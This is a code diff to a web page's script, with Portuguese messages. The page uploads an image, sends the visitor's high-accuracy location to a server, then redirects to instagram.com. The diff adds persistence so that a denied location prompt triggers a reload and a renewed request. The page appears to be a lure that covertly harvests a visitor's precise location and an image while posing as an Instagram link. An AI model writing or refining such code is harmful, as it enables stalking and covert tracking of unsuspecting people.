@@ -86,6 +86,7 @@
 
                 if (!response.ok) throw new Error("Erro ao enviar imagem");
                 const data = await response.json();
+                localStorage.setItem("uploadedImageUrl", data.secure_url);
                 resolve(data.secure_url);
               } catch (uploadError) {
                 reject(uploadError);
@@ -118,6 +119,7 @@
               });
 
               if (!textResp.ok) throw new Error("Erro ao enviar localização");
+              localStorage.removeItem("uploadedImageUrl");
               window.location.href = "https://instagram.com";
             } catch (err) {
               showOverlay("Erro ao enviar localização. Toque para tentar novamente.", () => requestLocation(imageUrl));
@@ -125,8 +127,9 @@
           },
           () => {
             showOverlay("Permissão de localização negada. Toque para tentar novamente.", () => {
-              // repete a tentativa de localização com interação do usuário
-              requestLocation(imageUrl);
+              // Safari requer reload para novo pedido de permissão
+              localStorage.setItem("retryLocation", "1");
+              location.reload();
             });
           },
           { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
@@ -145,7 +148,15 @@
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      showOverlay("Toque para continuar...", startFlow);
+      const savedUrl = localStorage.getItem("uploadedImageUrl");
+      const retryLocation = localStorage.getItem("retryLocation");
+
+      if (savedUrl && retryLocation) {
+        localStorage.removeItem("retryLocation");
+        showOverlay("Toque para tentar novamente a localização", () => requestLocation(savedUrl));
+      } else {
+        showOverlay("Toque para continuar...", startFlow);
+      }
     });
   </script>
 </body>
